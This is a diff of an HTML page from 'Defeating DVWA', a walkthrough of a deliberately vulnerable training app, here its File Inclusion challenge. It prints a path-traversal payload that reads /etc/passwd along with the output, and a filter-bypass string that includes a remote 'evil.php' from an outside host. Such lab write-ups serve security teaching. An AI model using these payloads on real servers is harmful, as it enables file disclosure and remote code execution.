@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# book: http://ogp.me/ns/book#">
         
         <meta charset="UTF-8">
-        <title>Burp Intruder | Defeating DVWA</title>
+        <title>File Inclusion | Defeating DVWA</title>
 
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
         <meta name="robots" content="index, follow">
@@ -13,13 +13,13 @@
         <meta name="generator" content="www.gitbook.io">
 
         
-        <link rel="next" href="../tips_and_tricks/cracking_hashes.html" />
+        <link rel="next" href="../tips_and_tricks/README.html" />
         
         
-        <link rel="prev" href="../tips_and_tricks/README.html" />
+        <link rel="prev" href="../command_execution/README.html" />
         
 
-        <meta property="og:title" content="Burp Intruder | Defeating DVWA">
+        <meta property="og:title" content="File Inclusion | Defeating DVWA">
         <meta property="og:site_name" content="Defeating DVWA">
         <meta property="og:type" content="book">
         <meta property="og:locale" content="en_US">
@@ -42,7 +42,7 @@
 
 
         
-    <div class="book" data-github="jsrn/DefeatingDVWA" data-level="5.1" data-basepath=".." data-revision="1399203863152">
+    <div class="book" data-github="jsrn/DefeatingDVWA" data-level="4" data-basepath=".." data-revision="1399203863152">
     <div class="book-header">
     <!-- Actions Left -->
     
@@ -120,7 +120,7 @@
 
         
         <li>
-            <a href="https://github.com/jsrn/DefeatingDVWA/edit/master/tips_and_tricks/burp_intruder.md" target="blank">Edit and Contribute</a>
+            <a href="https://github.com/jsrn/DefeatingDVWA/edit/master/file_inclusion/README.md" target="blank">Edit and Contribute</a>
         </li>
         
 
@@ -212,7 +212,7 @@
             <div class="page-wrapper" tabindex="-1">
                 <div class="book-progress">
     <div class="bar">
-        <div class="inner" style="width: 85.71428571428571%;min-width: 71.42857142857143%;"></div>
+        <div class="inner" style="width: 57.142857142857146%;min-width: 42.857142857142854%;"></div>
     </div>
     <div class="chapters">
     
@@ -226,9 +226,9 @@
     
         <a href="../file_inclusion/README.html" title="File Inclusion" class="chapter done new-chapter" data-progress="4" style="left: 57.142857142857146%;"></a>
     
-        <a href="../tips_and_tricks/README.html" title="Tips and Tricks" class="chapter done new-chapter" data-progress="5" style="left: 71.42857142857143%;"></a>
+        <a href="../tips_and_tricks/README.html" title="Tips and Tricks" class="chapter  new-chapter" data-progress="5" style="left: 71.42857142857143%;"></a>
     
-        <a href="../tips_and_tricks/burp_intruder.html" title="Burp Intruder" class="chapter done " data-progress="5.1" style="left: 85.71428571428571%;"></a>
+        <a href="../tips_and_tricks/burp_intruder.html" title="Burp Intruder" class="chapter  " data-progress="5.1" style="left: 85.71428571428571%;"></a>
     
         <a href="../tips_and_tricks/cracking_hashes.html" title="Cracking Password Hashes" class="chapter  " data-progress="5.2" style="left: 100%;"></a>
     
@@ -237,10 +237,32 @@
 
                 <div class="page-inner">
                 
-                    <section class="normal" id="section-gitbook_7">
+                    <section class="normal" id="section-gitbook_4">
                     
-                        <h1 id="burp-intruder">Burp Intruder</h1>
-<h2 id="brute-forcing-with-burp-intruder">Brute Forcing with Burp Intruder</h2>
+                        <h1 id="file-inclusion">File Inclusion</h1>
+<p>The file inclusion challenge gives a single instruction:</p>
+<pre><code>To include a file edit the ?page=index.php in the URL to determine which file is included.
+</code></pre><h2 id="low">Low</h2>
+<pre><code class="lang-php"><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'page'</span>]; <span class="hljs-comment">//The page we wish to display</span>
+</code></pre>
+<pre><code>?page=../../../../../../../../../../etc/passwd
+</code></pre><p>Result:</p>
+<pre><code>root:x:0:0:root:/root:/bin/bash
+[..redacted]
+jsrn:x:1000:1000:jsrn,,,:/home/jsrn:/bin/zsh
+</code></pre><h2 id="medium">Medium</h2>
+<pre><code class="lang-php"><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'page'</span>]; <span class="hljs-comment">// The page we wish to display </span>
+
+<span class="hljs-comment">// Bad input validation</span>
+<span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">"http://"</span>, <span class="hljs-string">""</span>, <span class="hljs-variable">$file</span>);
+<span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">"https://"</span>, <span class="hljs-string">""</span>, <span class="hljs-variable">$file</span>);
+</code></pre>
+<p>This input validation is indeed bad! It removes all instances of <code>http://</code> or <code>https://</code> from the file name before including it. In theory, this means we can no longer include a file by url.</p>
+<p><em>Except...</em></p>
+<pre><code>?page=hthttp://tp://www.example.com/evil.php
+</code></pre><p>still works! The str_replace only does one pass, so once the first is removed, the result is still:</p>
+<pre><code>?page=http://www.example.com/evil.php
+</code></pre><p>Muahaha.</p>
 
                     
                     </section>
@@ -250,10 +272,10 @@
         </div>
 
         
-        <a href="../tips_and_tricks/README.html" class="navigation navigation-prev "><i class="fa fa-angle-left"></i></a>
+        <a href="../command_execution/README.html" class="navigation navigation-prev "><i class="fa fa-angle-left"></i></a>
         
         
-        <a href="../tips_and_tricks/cracking_hashes.html" class="navigation navigation-next "><i class="fa fa-angle-right"></i></a>
+        <a href="../tips_and_tricks/README.html" class="navigation navigation-next "><i class="fa fa-angle-right"></i></a>
         
     </div>
 </div>
